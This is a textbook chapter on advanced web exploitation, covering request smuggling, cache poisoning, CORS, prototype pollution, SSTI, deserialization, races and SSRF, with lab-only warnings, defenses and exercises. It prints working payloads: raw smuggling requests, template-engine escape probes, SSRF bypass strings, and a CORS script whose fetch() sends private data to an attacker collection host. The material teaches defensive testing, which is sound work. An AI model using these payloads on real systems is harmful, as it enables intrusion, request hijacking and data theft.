# Chapter 10: Advanced Web Exploitation Concepts

> **Learning objectives.** Reason about multi-step attack chains; analyze authentication, authorization, and business logic deeply; understand desync, cache, race, prototype-pollution, OAuth/JWT, WebSocket, GraphQL, and multi-tenant failure modes; and document complex findings.

## 10.1 Thinking in Chains

Simple vulnerabilities are found by testing one parameter. Advanced research asks: *what can I combine?* A chain links individually low-severity issues into a high-impact outcome:

```
Open redirect -> OAuth token leakage -> account takeover
XXE -> SSRF -> internal admin endpoint -> secret disclosure
XSS -> CSRF bypass -> state change -> privilege escalation
Race condition -> coupon reuse -> financial loss
```

Chains often cross boundaries between components, which is why they are missed by scanners that test one endpoint at a time. To reason about chains, map **trust**, **state**, and **capabilities**:

- What can each component observe or influence?
- What state persists across requests (sessions, cache, DB)?
- What capability does each finding grant (read, write, execute, identity)?

## 10.2 Authentication Bypass Research

Areas to investigate in authorized targets:

- **Credential handling:** rate limits, lockout, timing differences (user enumeration), password reset flows, token entropy and expiry.
- **Logic paths:** login with unexpected content types, duplicate JSON keys, array-vs-string type juggling (`{"user":["admin"]}`), parameter pollution (`?user=a&user=admin`).
- **MFA:** can it be skipped by altering a response, reusing a code, or accessing a "trusted" device endpoint directly?
- **Session lifecycle:** fixation, rotation on login/privilege change, invalidation on logout/password change.
- **OAuth/OIDC:** state/PKCE validation, redirect_uri matching, token validation.

A key principle: **enforcement must be server-side and on every path.** A check that exists only in the browser or only on the primary login route is not a control.

## 10.3 Authorization Logic Analysis

Build a matrix of roles × actions × objects:

| Role | Read own | Read others | Update own | Admin function |
|------|----------|-------------|------------|----------------|
| anon | no | no | no | no |
| user | yes | no | yes | no |
| admin | yes | yes | yes | yes |

Test every cell with a controlled account. Pay special attention to:

- Endpoints that accept a role or tenant parameter from the client.
- Bulk operations and export endpoints (often forgotten).
- Differences between REST and GraphQL paths to the same data.
- "Internal" endpoints protected only by network position.

## 10.4 Desync and Request Smuggling Theory

Modern stacks mix HTTP/1.1 and HTTP/2, TLS terminators, and multiple proxies. Desynchronization arises when components parse the same byte stream differently. Beyond CL.TE/TE.CL (Chapter 9), advanced variants include:

- **CL.0 / desync:** a front-end treats a request as ended by Content-Length while the back-end keeps the connection open.
- **HTTP/2 → HTTP/1.1 downgrade smuggling:** header translation differences (e.g., how `:authority`, `content-length`, or `transfer-encoding` are converted).
- **Header name/value confusion:** duplicated headers, whitespace, or line-folding differences.

Safe validation requires dedicated labs (PortSwigger's smuggling labs) with harmless marker prefixes, controlled timing, and absolutely no production targets. The impact — hijacking other users' requests or bypassing front-end security controls — makes this a high-severity research area, but also one where accidental harm is easy. Stay in the lab.

## 10.5 Cache Behavior Analysis

To analyze caching:

1. Identify cacheable responses via `Cache-Control`, `Age`, `X-Cache`, `CF-Cache-Status`.
2. Determine the cache key (URL path, query, headers, cookies).
3. Find inputs that influence the response but are not in the key.
4. Test in your own lab whether a crafted header changes a cached response for a normal visitor.

The classic pattern: a response reflects `X-Forwarded-Host` into a script URL, and the cache ignores that header. Poison the cache once; every visitor receives the malicious response. Defenses: include influential headers in the key, strip untrusted headers at the edge, and avoid reflecting headers into responses.

## 10.6 Race Condition Research

Advanced race research uses synchronization to widen the timing window:

- Send many requests in parallel with a barrier (e.g., threads released simultaneously).
- Use HTTP/2 single-packet attacks to reduce network jitter.
- Look for TOCTOU between check and use: coupon redemption, balance checks, one-time tokens, file operations, invite acceptance.

A robust lab demonstration shows a state that should be impossible (e.g., a coupon used three times). Remediation is atomicity: database transactions with row locks, idempotency keys, and unique constraints.

## 10.7 Prototype Pollution Deep Dive

Sources: `JSON.parse` merged via recursive `merge`, `Object.assign`, query-string parsers, and libraries with unsafe deep-merge.

Gadgets: after polluting `Object.prototype`, downstream code that checks `obj.isAdmin` or iterates properties can behave unexpectedly. Real chains are highly application-specific.

Investigation in a lab:

```javascript
JSON.parse('{"__proto__":{"polluted":"yes"}}') // creates own __proto__ key in JSON.parse
// then a vulnerable deep-merge copies it into Object.prototype
console.log({}.polluted) // "yes" if pollution occurred
```

Remediation: reject `__proto__`, `constructor`, `prototype` keys; use `Object.create(null)`; use `Map`; freeze prototypes; validate with schema libraries.

## 10.8 Advanced SSRF

Bypass techniques studied in labs include:

- Alternative IP formats: decimal (`2130706433` = 127.0.0.1), octal, IPv6 mapped (`::ffff:127.0.0.1`).
- DNS rebinding: a hostname resolves to a public IP during validation and a private IP at fetch time.
- Open redirects and URL parsing quirks to bypass allow-lists (`http://allowed.com@127.0.0.1/`).
- Non-HTTP protocols (`gopher://`, `file://`, `dict://`) where supported.
- Redirect chains where validation occurs only on the first hop.

Defense-in-depth: resolve DNS and pin the validated IP, block private/link-local/loopback ranges (IPv4 and IPv6), disable redirects, enforce egress firewalling, and require IMDSv2 on cloud instances.

## 10.9 OAuth and JWT Implementation Flaws

OAuth pitfalls: missing `state`, absent PKCE for public clients, loose `redirect_uri` matching (prefix/suffix bypass), token leakage via referrers or browser history, and accepting tokens from the wrong issuer.

JWT pitfalls: `alg:none`, RS256→HS256 confusion, weak HMAC secrets, accepting tokens with missing/expired `exp`, ignoring `aud`/`iss`, and confusing "decoded" with "verified."

In a lab, demonstrate a measurable impact (e.g., forging a token for another test user). Never attack real authentication systems.

## 10.10 WebSocket and GraphQL Security

**WebSockets:** the server must validate `Origin` (browsers do not enforce SOP for WebSockets); messages need authentication, authorization, size limits, and rate limits. Test in labs for CSWSH (cross-site WebSocket hijacking) and missing per-message authorization.

**GraphQL:** introspection disclosure, excessive query depth/complexity (DoS), resolver-level authorization gaps, batching attacks that evade rate limits, and mutations that bypass REST checks. Test every resolver with a second test account; use complexity limits and persisted queries as defenses.

## 10.11 Multi-Tenant Isolation Failures

SaaS applications must isolate tenants at every layer: database rows, object storage prefixes, cache keys, search indices, logs, and background jobs. Failures include:

- Missing tenant filter in a query.
- Cache keyed only by object ID, not tenant ID.
- File paths using predictable tenant-unique names.
- Async jobs that trust a tenant ID from the message payload.

These are high-severity because they expose multiple customers' data. Test only with your own two tenants in an authorized program.

## 10.12 Chained Case Study (Fictional)

A lab application has three issues:

1. A profile field reflects user input into a page without encoding (XSS) but the session cookie is HttpOnly.
2. A password-reset flow uses a predictable token and no rate limit.
3. The password-reset endpoint trusts a `Host` header to build the reset link.

Individually: XSS (limited by HttpOnly), weak token (low if rate-limited?), Host injection (low). Chained: XSS in a victim's session reads a CSRF token, triggers a password reset with a poisoned Host so the link points to the attacker's server, and the weak token is brute-forced — producing account takeover. The chain demonstrates why impact assessment must consider downstream capabilities, not just the isolated bug.

## 10.13 Reporting Complex Chains

- Describe each link clearly and the capability it grants.
- Provide a step-by-step PoC with exact requests.
- Show the final impact with your own test accounts.
- Map each link to CWE where applicable.
- Note prerequisites (e.g., victim interaction) honestly.

## 10.16 Mastery Deep Dive: Request Smuggling Mechanics

### 10.16.1 Why desync happens

A front-end (CDN, reverse proxy) and a back-end (app server) often parse the same byte stream with different rules. If they disagree on where one request ends and the next begins, an attacker can make a "smuggled" prefix be interpreted by the back-end as the start of a new request — one that never passed the front-end's routing, authentication, or logging. All tests below are for dedicated labs only (e.g., PortSwigger Web Security Academy); never send these to third parties.

The key headers are `Content-Length` (CL), which gives an exact byte length, and `Transfer-Encoding: chunked` (TE), which encodes the body in chunks terminated by a zero-length chunk. RFC 9112 says if both are present, TE takes precedence and CL must be ignored — but implementations disagree.

### 10.16.2 CL.TE desync

The front-end uses `Content-Length`, the back-end uses `Transfer-Encoding`. The front-end stops the request at the CL boundary; the back-end reads a chunked body until `0`, leaving the following bytes as the next request.

```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end sees a 6-byte body (`0\r\n\r\nG`) and forwards. The back-end processes the chunk `0` (end of body), then sees `G` as the first byte of the next request. A classic follow-up request smuggled behind it:

```http
GPOST /lab HTTP/1.1
Host: <LAB_HOST>
Content-Length: 5

x=1
```

In a lab, detection uses timing: append a prefix that causes the back-end to wait for more bytes, producing a measurable delay on the next request on the same connection. Confirm with a harmless marker that appears in another (lab-owned) request.

### 10.16.3 TE.CL desync

The front-end uses `Transfer-Encoding`, the back-end uses `Content-Length`. The front-end reads a chunked body; the back-end reads exactly CL bytes, leaving the rest as the next request.

```http
POST / HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /lab HTTP/1.1
Host: <LAB_HOST>
Content-Length: 5

x=1
0

```

Here the front-end consumes the whole chunk (length `0x5c` = 92) as one chunk followed by `0`. The back-end reads only 4 bytes, then treats `GPOST...` as a fresh request. Lab verification uses the same timing/marker discipline.

### 10.16.4 TE.TE desync

Both servers support TE, but one can be tricked into ignoring it via obfuscation — e.g., `Transfer-Encoding: xchunked`, duplicated TE headers, or whitespace/tab variants (`Transfer-Encoding : chunked`, `chunked` with trailing space). If the front-end honors the obfuscated TE and the back-end ignores it (or vice versa), you get CL.TE or TE.CL behavior. This is why normalization — not just presence checks — matters.

### 10.16.5 CL.0, HTTP/2 downgrade, and detection

**CL.0:** a front-end treats a request as complete by CL while the back-end keeps the connection open, treating subsequent bytes as a new request on the same connection — common where a proxy supports HTTP/1.1 keep-alive differently. **HTTP/2 → HTTP/1.1 downgrade smuggling:** translation of `:authority`, `:path`, `content-length`, and `transfer-encoding` into HTTP/1.1 headers can produce conflicts or duplication. Detection methodology in labs:

1. Identify the stack (HTTP/1 vs HTTP/2 front/back) via `curl -v`, `Alt-Svc`, and response headers.
2. Probe framing with benign variations and measure timing differences on follow-up requests.
3. Use a marker request whose smuggled prefix appends to a *lab-owned* subsequent request; observe the tampered result.
4. Stop immediately if behavior affects anything outside your lab.

Defense: reject requests with ambiguous framing (both CL and TE), normalize/deduplicate headers, disable back-end keep-alive or use distinct connection pools, and prefer HTTP/2 end-to-end. Verify with a regression test that replays each smuggling payload and confirms a 400 rejection and no cross-request contamination.

## 10.17 Mastery Deep Dive: Cache Poisoning and Host Header Abuse

### 10.17.1 Cache key mechanics

A cache stores responses under a **key** derived from parts of the request (typically method, host, path, query). Inputs that influence the response but are excluded from the key are poisoning opportunities. Discover the key by adding a unique value to a candidate input (a header or query param), requesting twice, and seeing whether the response changes with and without the value. Useful observed headers: `X-Cache: HIT/MISS`, `CF-Cache-Status`, `Age`, `Cache-Control`.

### 10.17.2 Poisoning patterns (labs only)

| Pattern | Unkeyed input | Defensive fix |
|---------|---------------|---------------|
| Header reflection | `X-Forwarded-Host` reflected into a script URL | Strip/normalize at edge; include in key; don't reflect |
| Query param reflection | `?cb=...` reflected without being keyed | Key on full query; percent-encode output |
| Method override | POST body reflected, cached as GET response | Separate cache by method; `Cache-Control: private` |
| Path confusion | Trailing slash or `;`/encoded path cached under wrong key | Canonicalize paths; normalize before keying |

Lab validation: send a request with a benign but unique header value (e.g., `X-Forwarded-Host: lab-marker.<LAB_HOST>`), then issue a normal GET to the same URL and confirm the marker appears in the cached response. Then verify your fix by repeating and confirming the marker never propagates. **Cache deception** is the inverse: trick the cache into storing a personalized response by making its URL look static (`/lab/user/profile.css`). Defenses: explicit cache rules, `Cache-Control: private/no-store`, and cookies in the cache key for personalized pages.

### 10.17.3 Host header abuse

Apps use `Host` (and `X-Forwarded-Host`, `X-Real-IP`) to generate absolute URLs — password resets, email links, redirects. If unvalidated, an attacker poisons those links. Alternate vectors: absolute-form request lines, duplicate Host headers, and port suffixes. Lab test: supply `Host: attacker.<LAB_HOST>` and observe generated URLs in a reset email or redirect `Location`. Impact: phishing, reset-link hijacking, and cache-poisoned script sources. Defense: validate Host against a canonical allow-list at both edge and app, reject unknown hosts, and build URLs from configured origins rather than request headers. Verify by replaying hostile Host values and confirming rejection.

## 10.18 Mastery Deep Dive: CORS Misconfigurations

### 10.18.1 The dangerous patterns

CORS is a read permission granted by the server to browser origins. The high-severity misconfiguration is reflecting the `Origin` value with `Access-Control-Allow-Credentials: true`, which lets any attacker-controlled origin read authenticated responses. Other patterns: trusting origins that *start/end with* a trusted string (`evil-example.com`, `example.com.evil.com`), allowing `null` origins (sandboxed iframes and `data:` URLs can produce `Origin: null`), and using `*` with credentials (browsers reject, but custom clients ignore CORS anyway — so CORS is never an authorization control).

### 10.18.2 Lab-safe exploitation pattern

With an app you own, host a page on an "attacker" lab origin that performs:

```javascript
fetch('https://<LAB_HOST>/api/private', { credentials: 'include' })
  .then(r => r.text())
  .then(t => fetch('https://attacker.<LAB_HOST>/collect?d=' + encodeURIComponent(t)));
```

If the vulnerable lab server reflects the attacker origin with credentials, the victim's private data is readable cross-origin. A second variant uses `Origin: null` from a sandboxed iframe. Detection: send a request with a controlled `Origin`, observe `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`, and verify the reflected value matches exactly. Defense: exact-match allow-list of trusted origins, no wildcard with credentials, reject `null`, and `Vary: Origin`. Verify by replaying from a disallowed origin and confirming the browser blocks the response. Common mistake: treating CORS as a substitute for authorization — non-browser clients ignore it entirely.

## 10.19 Mastery Deep Dive: Prototype Pollution — Client and Server

### 10.19.1 The mechanism, precisely

JavaScript property lookup walks the prototype chain. If an attacker can set a property on `Object.prototype` (or another widely used prototype), every object that inherits from it appears to have that property. The two injection keys are `__proto__` and the pair `constructor.prototype`. Unsafe deep-merge, clone, and query-string parsers are the usual **sources**.

```javascript
// Source: attacker-controlled JSON
const input = JSON.parse('{"__proto__":{"isAdmin":true,"role":"admin"}}');
// Vulnerable recursive merge
function merge(target, src) {
  for (const key of Object.keys(src)) {
    if (typeof src[key] === 'object' && src[key] !== null) {
      target[key] = merge(target[key] || {}, src[key]);
    } else {
      target[key] = src[key];   // writes to target.__proto__.isAdmin
    }
  }
  return target;
}
merge({}, input);
console.log({}.isAdmin); // true — prototype polluted
```

Note: `JSON.parse` creates an *own* property named `__proto__`; it is the unsafe merge that assigns through it to the prototype. This distinction matters when reasoning about which libraries are vulnerable.

### 10.19.2 Sources, gadgets, and sinks

- **Sources:** unsafe `merge`/`extend`/`set` utilities, query-string parsers that create nested objects (e.g., `a[__proto__][x]=1`), and MIME/header parsers.
- **Gadgets:** downstream code that reads an inherited property (e.g., `if (user.isAdmin)`), iterates `for...in` (inherited enumerable properties appear), or passes an object to a template engine or HTML sanitizer option.
- **Sinks:** authorization checks, template rendering options (rashomon in some template libs), DOM `innerHTML` assignments influenced by polluted properties, and Node.js option objects (e.g., polluting `NODE_OPTIONS` paths).

Client-side pollution can reach DOM XSS when a polluted property is later assigned to `innerHTML`. Server-side (Node.js) pollution can reach authorization or RCE in rare gadget chains. Detection in a lab: pollute a harmless sentinel (`{"__proto__":{"labMarker":"yes"}}`) and check `{}.labMarker` and whether a downstream object unexpectedly has it. If a privileged check reads a polluted property, escalate to a controlled impact in the lab.

### 10.19.3 Defense and verification

Reject keys `__proto__`, `constructor`, and `prototype` in all recursive merge/parse functions. Use `Object.create(null)` for dictionaries, prefer `Map`, and freeze prototypes (`Object.freeze(Object.prototype)`) where feasible. Validate object shapes against schemas before use. Verify with the exact lab payload: after the fix, `{}.labMarker` must be `undefined` and the authorization check must still deny.

## 10.20 Mastery Deep Dive: SSTI by Template Engine

### 10.20.1 Root cause and detection

Server-side template injection occurs when user input is concatenated into a template *source string* before rendering, so the engine parses it as template code rather than data. First detect with engine-agnostic arithmetic probes: `{{7*7}}` → `49` (Jinja/Twig), `${7*7}` → `49` (Java EL/Thymeleaf), `<%= 7*7 %>` → `49` (ERB), `#{7*7}` (Ruby), `{7*7}` (some JS templates). If the expression evaluates, you have code-context injection.

### 10.20.2 Engine-specific patterns (lab only)

| Engine | Syntax | Lab fingerprint / capability probe |
|--------|--------|-------------------------------------|
| Jinja2 (Python/Flask) | `{{ }}` | `{{ 7*7 }}`; access `{{ config.items() }}` / `{{ ''.__class__.__mro__ }}` for RCE chains |
| Twig (PHP) | `{{ }}` | `{{7*7}}`; `{{ _self.env }}` gadget chains in old versions |
| Handlebars (Node) | `{{ }}` | `{{#with}}` helpers; prototype-pollution-assisted RCE in some versions |
| FreeMarker (Java) | `{ }` | `{7*7}`; `<#assign>` and freemarker.template.utility.Execute in old setups |
| Thymeleaf (Java) | `{ }`, `~{ }` | `{7*7}`; expression injection in fragment/URL contexts |
| Velocity (Java) | `#set(x=...)` | `#set(x=7*7)$x` |

Impact escalation typically involves reaching the template engine's object model to call OS functions — a large topic best studied per engine in dedicated labs. All payloads here are for authorized lab targets; use harmless markers (`id`, a file write to `/tmp`) to prove execution.

### 10.20.3 Defense and verification

Never build template source from user input. Use static templates with parameters (e.g., `render_template('greet.html', name=name)`), so user data is a value, never code. If a feature truly needs dynamic templates, restrict them to a tiny, sandboxed subset with no object access. Keep engines patched. Verify by replaying `{{7*7}}`: it must render literally (or be rejected), never evaluate. False positive: the framework evaluates the expression on the client or escapes it — confirm where evaluation happens.

## 10.21 Mastery Deep Dive: Deserialization Gadgets

### 10.21.1 How gadget chains work

Native deserializers instantiate classes and set properties from the stream. A **gadget chain** is a sequence of existing classes/methods in the application's dependency graph where one object's magic method (e.g., `__destruct`, `readObject`, `toString`) invokes another, culminating in a dangerous sink (command execution, file write). Tools like ysoserial (Java) and phpggc (PHP) build such chains — for labs only.

Recognition: serialized formats have telltale prefixes — Java `rO0AB` (base64), PHP `O:`/`a:`, .NET `AAEAAAD//`, Python pickle `\x80\x04`. Locations: session cookies, "remember me" tokens, cache values, message-queue payloads, and RPC bodies. Lab-safe validation: use a gadget whose effect is harmless (`touch /tmp/lab-proof` or a DNS callback to your lab listener), then observe the effect. Never run destructive payloads, and never against third-party systems.

### 10.21.2 Defense and verification

Avoid native serialization for untrusted input entirely — use JSON with strict schemas. If you must deserialize: cryptographically sign/encrypt blobs so tampering is detected, apply type allow-lists (Java JEP 290 filters, .NET `SerializationBinder`), and keep libraries patched to remove known gadgets. Verify by replaying a lab gadget: a signature failure or filter rejection must occur and no effect must be observed. Detection on the blue side: alert on deserialization of unexpected classes and on serialized blobs with anomalous sizes.

## 10.22 Mastery Deep Dive: Race Conditions and Limit Overrun

### 10.22.1 The check-use gap

A race (TOCTOU) exists when a security check and the action it guards are not atomic. Two concurrent requests both pass "credit available," "coupon unused," or "one-time token valid" before either commits, so both succeed. The classic lab example is a limit overrun: redeem a coupon twice.

Methodology in labs:

1. Find a multi-step, shared-state operation (coupon, balance, invite, one-time token, file write).
2. Remove network jitter so requests land together: use threads released by a barrier, or HTTP/2 multiplexing to send many streams in one packet.
3. Send N simultaneous requests with the same token/parameter and observe whether the server honors more than the allowed count.
4. Prove impact with your own account (e.g., a discount applied twice, a balance driven negative).

A robust demonstration shows a *state that should be impossible* — that is the signature of a real race, and it is far stronger evidence than a timing anomaly.

### 10.22.2 Defense and verification

Make check-and-use atomic: database transactions with row locks (`SELECT ... FOR UPDATE`), compare-and-swap, or idempotency keys with unique constraints (a UNIQUE index on `(user_id, coupon_id)` rejects the second redemption). Use per-resource locks and never trust client-side sequence numbers. Verify by replaying the exact N-request burst and confirming only one succeeds, with consistent final state. Common mistake: relying on fast code or "it usually doesn't happen" — network and scheduling variance guarantee that it eventually will.

## 10.23 Mastery Deep Dive: HTTP Parameter Pollution, Mass Assignment, and Bypass Patterns

### 10.23.1 HTTP parameter pollution (HPP)

When a parameter appears multiple times (`?id=1&id=2`) or as different encodings, frameworks disagree on which value wins: first, last, joined, or array. A validator may inspect the first while the data layer uses the last. Test in labs: duplicate a parameter with one benign and one privileged value, vary order, try array syntax (`id[]=1&id[]=2`), and compare the validator's view with the outcome (e.g., does the "safe" value pass validation but the other value reach SQL?). Defense: reject duplicate parameters outright; normalize once at the boundary.

### 10.23.2 Mass assignment / auto-binding

Frameworks that bind request fields directly to model objects let an attacker set fields the developer never intended: `{"username":"bob","email":"b@lab","isAdmin":true,"role":"admin"}`. If the binding layer copies all fields, privilege escalation follows. Test in a lab by adding unexpected fields (including nested/array forms) and checking whether the stored object reflects them. Defense: explicit allow-lists of writable fields (DTOs), never bind directly to persistence models, and ignore unknown fields with an error. Verify that the extra field is ignored and the object remains unchanged.

### 10.23.3 Bypass patterns cookbook

A disciplined set of transformations to try *in authorized labs* when a control seems solid:

- **Encoding:** URL-encode, double-encode, UTF-8 overlong sequences, Unicode normalization, `%00` truncation, base64 of nested structures.
- **Parsing:** duplicate keys, type confusion (string↔array↔object), content-type swaps (`application/json` ↔ form ↔ XML), uppercase/lowercase header names, trailing delimiters (`;` in paths).
- **Method:** override headers, verb casing (`get`), `X-Original-URL`/`X-Rewrite-URL` affecting routing.
- **Trust:** spoofed forwarded headers, alternate Host forms, absolute-form request lines.
- **Context:** a control present on one endpoint but not a parallel REST/GraphQL/mobile path to the same data.

Each bypass should be recorded with the exact bytes, the component that mis-parsed, and the resulting unauthorized capability.

## 10.24 Mastery Deep Dive: Defense, Verification, and Practice

### 10.24.1 Defense-in-depth summary

- **Smuggling:** reject ambiguous framing; normalize headers; HTTP/2 end-to-end; distinct connection pools.
- **Caching:** include influential inputs in keys; strip untrusted headers; `Cache-Control: private/no-store` for personalized data.
- **CORS:** exact-origin allow-lists; reject `null`; no wildcard with credentials.
- **Prototype pollution:** reject dangerous keys; `Object.create(null)`/`Map`; freeze prototypes.
- **SSTI:** static templates with bound parameters; keep engines patched.
- **Deserialization:** data-only formats; signed/encrypted blobs; type allow-lists.
- **Races:** atomic operations, unique constraints, idempotency keys.
- **HPP/mass assignment:** reject duplicates; explicit writable-field allow-lists.

### 10.24.2 What mastery looks like — checklist

- [ ] I can write CL.TE, TE.CL, and TE.TE byte-level examples and explain which component misparses each.
- [ ] I can determine a cache key experimentally and validate both poisoning and deception in a lab.
- [ ] I can recognize and exploit (in a lab) the four dangerous CORS patterns with exact header observations.
- [ ] I can build a prototype-pollution PoC and name a downstream gadget and sink.
- [ ] I can fingerprint five template engines and validate a harmless SSTI probe.
- [ ] I can identify serialized-object formats and validate a harmless deserialization gadget.
- [ ] I can produce a race-condition proof showing an impossible state.
- [ ] I can list HPP, mass-assignment, and encoding/parsing bypass transformations.

### 10.24.3 Common mistakes

- Testing smuggling, cache poisoning, or Host attacks on systems outside a dedicated lab — the collateral impact is real and unacceptable.
- Confusing a reflected template string with evaluated one; always check whether arithmetic actually computes.
- Assuming a fix worked without replaying the exact original payload.
- Underestimating races because "the code is fast" — scheduling variance defeats that assumption.

### 10.24.4 Knowledge checks (answers below)

1. In a CL.TE desync, which side uses CL and which uses TE, and what byte is left for the next request?
2. Why does reflecting `Origin` with `Access-Control-Allow-Credentials: true` constitute a serious flaw?
3. Why doesn't `JSON.parse` itself pollute prototypes, yet a merge of its output can?
4. What single database measure most reliably stops coupon double-redemption?
5. What does `{{7*7}}` evaluating to `49` tell you about a template context?

**Answers.** (1) Front-end uses CL, back-end uses TE; the bytes after the chunked terminator (e.g., `G`) are left and parsed as the next request's start. (2) Any origin can read authenticated cross-origin responses, defeating SOP for credentialed data. (3) `JSON.parse` creates an own property literally named `__proto__`; an unsafe merge that assigns through it writes to the real prototype. (4) A UNIQUE constraint on `(user_id, coupon_id)` (atomic check-and-insert). (5) User input is being parsed as template source in a server-side template (SSTI).

### 10.24.5 Lab exercises

1. In PortSwigger's smuggling labs, craft CL.TE and TE.CL payloads that make a harmless marker appear in a subsequent lab request.
2. Set up a lab cache and demonstrate poisoning via an unkeyed `X-Forwarded-Host`; then fix and verify.
3. Build a small Node app with an unsafe deep-merge; pollute a sentinel and then fix it with key rejection and `Object.create(null)`.
4. Spin up a Flask lab with `render_template_string`; confirm `{{7*7}}` evaluates, then switch to static templates and confirm it renders literally.
5. Write a threaded script (targeting your own lab) that redeems a coupon ten times; prove the impossible state, add a unique constraint, and prove it stops.

## 10.25 Mastery Deep Dive: Advanced Smuggling Variants

### 10.25.1 Response queue poisoning

When a desync lets an attacker smuggle a request whose response is delivered to a *different* user on the same connection, the result is **response queue poisoning**. In a lab, the attacker sends a request with a large CL so the back-end waits for the remainder; a victim's next request gets prepended to the waiting bytes, and the attacker's subsequent request receives the victim's response. This can leak session cookies or CSRF tokens. The defensive lesson: never share a front-end/back-end connection across untrusted users, and reject ambiguous framing before it reaches a shared pool. Verify a fix by replaying the desync in a lab and confirming each connection is isolated to one user and responses are correctly paired.

### 10.25.2 HTTP/2 downgrade smuggling in detail

When an HTTP/2 front-end forwards to an HTTP/1.1 back-end, it must translate pseudo-headers and compressed headers into a textual request. Bugs arise when: `:method`/`:path` are translated inconsistently; duplicated `content-length` headers are emitted; `transfer-encoding` is preserved from a client-supplied header; or header names are case-folded differently. An attacker may inject CRLF sequences into a header value that the HTTP/2 parser allows but the HTTP/1.1 serializer emits literally, creating new headers at the back-end. Lab validation requires byte-level control (custom clients, dedicated labs). Defense: strip hop-by-hop and framing headers from client input, validate that translated headers contain no CR/LF, and reject requests that would produce conflicting framing. Verify with regression tests that replay each translation payload.

### 10.25.3 CL.0 and connection-state attacks

CL.0 arises when a front-end ends a request at `Content-Length` while the back-end treats the connection as still carrying more data (or vice versa), often because one side uses keep-alive differently. A follow-up request smuggled on that connection can bypass front-end path-based ACLs — for example, reaching `/admin` when the front-end only blocks it at the edge. In labs, demonstrate the ACL bypass with a harmless marker endpoint. Defense: normalize `Connection` and framing, avoid reusing connections across trust boundaries, and enforce authorization at the application layer (so a front-end path block is not the only control).

## 10.26 Mastery Deep Dive: Advanced Cache Poisoning

### 10.26.1 Finding unkeyed inputs

Cache poisoning hinges on inputs that influence the response but are not in the key. Systematic lab discovery:

1. Normalize a request and record the response; request again to confirm a cached HIT.
2. Add a unique value to a candidate input (header, query param, cookie, method override) and see if the body changes.
3. Repeat the *normal* request; if it now returns the changed body, that input is unkeyed and influential — a poison vector.
4. Escalate carefully in the lab: reflect a harmless marker (never malicious JS) and confirm it is served to a second, clean visitor.

Candidates worth testing: `X-Forwarded-Host`, `X-Forwarded-Scheme`/`X-Forwarded-Proto`, `X-Original-URL`, `Host`, `Referer`, `User-Agent`, and unkeyed query parameters.

### 10.26.2 Poisoning impact classes

- **XSS via poisoned script URL:** a header reflected into a `<script src>` poisons the page for every visitor — high severity.
- **Redirect poisoning:** a reflected `Location` header sends visitors to an attacker-controlled site.
- **Login/CSRF-token poisoning:** replacing a cached page's CSRF token with the attacker's enables account takeover flows.
- **DoS:** poisoning a cache with an error response for a popular URL (still unauthorized and harmful — confine to labs).

Defenses: include influential inputs in the key, strip untrusted headers at the edge, avoid reflecting request data into responses, set `Cache-Control: private/no-store` for personalized responses, and use cache-busting / versioned asset URLs. Verify by replaying each poison and confirming the marker never appears in a clean visitor's response.

## 10.27 Mastery Deep Dive: Advanced Deserialization and SSTI Escalation

### 10.27.1 Gadget chains in practice

A gadget chain is assembled from classes already on the classpath: a "source" whose deserialization callback runs automatically, intermediate "transformer" objects that invoke methods, and a "sink" that performs the dangerous action (e.g., `Runtime.exec`). Tools (ysoserial for Java, phpggc for PHP) generate serialized blobs for known library chains — use them **only in isolated labs** with a harmless effect such as `touch /tmp/lab-proof` or a callback to your listener. The general methodology: (1) identify the format and libraries from stack traces or error messages; (2) determine which gadget chains are available for those versions; (3) deliver a harmless chain; (4) observe the effect. Defense: remove the root cause (no native deserialization of untrusted input), plus JEP 290 filters / type allow-lists and signed blobs as compensating controls. Verify by replaying the lab blob and confirming rejection with no effect.

### 10.27.2 SSTI sandbox escapes by engine

Modern template engines try to sandbox expressions, but researchers regularly find escapes. Study these in labs, per engine:

- **Jinja2:** reach `().__class__.__base__.__subclasses__()` to enumerate loaded classes and find one with a useful `os`/`subprocess` reference.
- **Twig:** older versions expose `_self.env` to call arbitrary PHP callables; patched versions block this.
- **FreeMarker:** `freemarker.template.utility.Execute` was a classic RCE gadget when class instantiation was allowed.
- **Handlebars/AngularJS-style:** prototype pollution of template options or helper contexts can enable code paths.

The defense is structural: use static templates with bound data, keep engines patched, and disable dangerous features. Verify by replaying `{{7*7}}` and the escalation probe: both must render literally or be rejected. Never run these against systems outside a dedicated lab.

## 10.28 Mastery Deep Dive: Chaining and Parser-Differential Bypasses

### 10.28.1 Designing chains

Advanced findings often chain low-severity issues. A repeatable method: list each finding and the **capability** it grants (read, write, execute, identity, network position); then look for a second finding that consumes that capability. Examples: open redirect → OAuth token leakage → account takeover; XXE → SSRF → internal endpoint → secret; XSS → CSRF-token theft → state change; race → coupon reuse → financial loss. Map trust boundaries between findings and document prerequisites honestly. Verify each chain end-to-end in a lab with your own accounts; a chain is only as strong as its weakest link.

### 10.28.2 Parser-differential fuzzing

Because desync and bypass bugs arise from *disagreement*, fuzz the boundaries rather than the app: send variant byte sequences to a lab proxy and compare what the front-end and back-end appear to accept. Vary: framing header combinations, whitespace and case, duplicate headers, URL encoding of path separators, and content-type values. Record any request where two components interpret the same bytes differently. This is meticulous work but it is how entire vulnerability classes were first discovered. Confine every test to lab infrastructure.

### 10.28.3 Verification and regression

For every advanced finding, maintain a regression artifact: the exact raw request bytes, the expected vulnerable behavior, and the expected hardened behavior. After a fix, replay the artifact and confirm the hardened behavior. For desync/cache/race issues, run the test multiple times because timing and cache state introduce variance — a single "pass" is not proof. Common mistake: declaring a fix successful after one attempt; require consistent, repeatable rejection.

## 10.29 Mastery Deep Dive: Advanced SSRF, WebSockets, GraphQL, and Tenancy

### 10.29.1 SSRF bypass mechanics in depth

When an allow-list exists, lab researchers study how parsers and resolvers disagree:

- **Alternative IP encodings:** decimal (`2130706433` = 127.0.0.1), octal (`0177.0.0.1`), hex, and IPv6-mapped (`::ffff:127.0.0.1`) forms that pass a string-based check but resolve to loopback.
- **DNS rebinding:** a hostname under your control resolves to an allowed public IP during validation, then to a private IP at fetch time (short TTL). Defeated by resolving once and pinning the validated IP for the actual request.
- **URL parser quirks:** userinfo confusion (`http://allowed.com@127.0.0.1/`), backslashes, embedded credentials, and fragment/`#` handling differ between validators and HTTP clients.
